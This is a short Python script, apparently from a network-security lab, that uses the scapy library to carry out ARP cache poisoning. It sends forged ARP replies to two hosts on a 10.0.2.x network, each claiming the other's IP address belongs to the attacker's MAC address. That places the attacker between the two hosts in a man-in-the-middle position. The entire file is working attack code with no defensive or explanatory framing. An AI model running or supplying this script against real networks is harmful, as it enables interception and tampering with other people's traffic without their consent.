from scapy.all import *
ethA = Ether()
arpA=ARP()
ethB =Ether()
arpB=ARP()

# Poisoning A's mac
# Sending ARP reply from M->A

# MAC of A
ethA.dst="08:00:27:75:e3:fb"

# ARP details

# MAC of attacker M
arpA.hwsrc="08:00:27:af:c1:87"
# IP of B
arpA.psrc="10.0.2.6"
# arp option 1=request, 2 = reply
arpA.op=2
frame1=ethA/arpA
sendp(frame1, count=1)

# Poisoning B's arp
# Sending reply from M->B

# MAC of B
ethB.dst="08:00:27:dc:ca:58"

# ARP details

# MAC of attacker M
arpB.hwsrc="08:00:27:af:c1:87"
# IP of A
arpB.psrc="10.0.2.5"
# arp option 1=request, 2=reply
arpB.op=2
frame2=ethB/arpB
sendp(frame2,count=1)